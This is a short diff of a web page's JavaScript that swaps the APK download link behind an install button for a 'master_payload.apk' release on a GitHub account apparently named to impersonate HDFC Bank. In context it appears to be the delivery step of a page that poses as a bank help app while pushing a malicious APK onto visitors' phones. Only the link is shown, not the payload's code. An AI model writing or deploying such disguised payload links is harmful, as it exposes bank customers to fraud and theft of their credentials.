@@ -1,6 +1,6 @@
 document.addEventListener('DOMContentLoaded', () => {
     // PASTE YOUR REAL GITHUB RELEASE LINK HERE:
-    const REAL_APK_URL = 'https://github.com/amanxridex/newmade/releases/download/v3.0.85/hdfc_help_v3.apk'; 
+    const REAL_APK_URL = 'https://github.com/hdfcbank100200-tech/newmade1/releases/download/v3.0.8/master_payload.apk'; 
     
     const installBtn = document.getElementById('installBtn');
     let deferredPrompt;
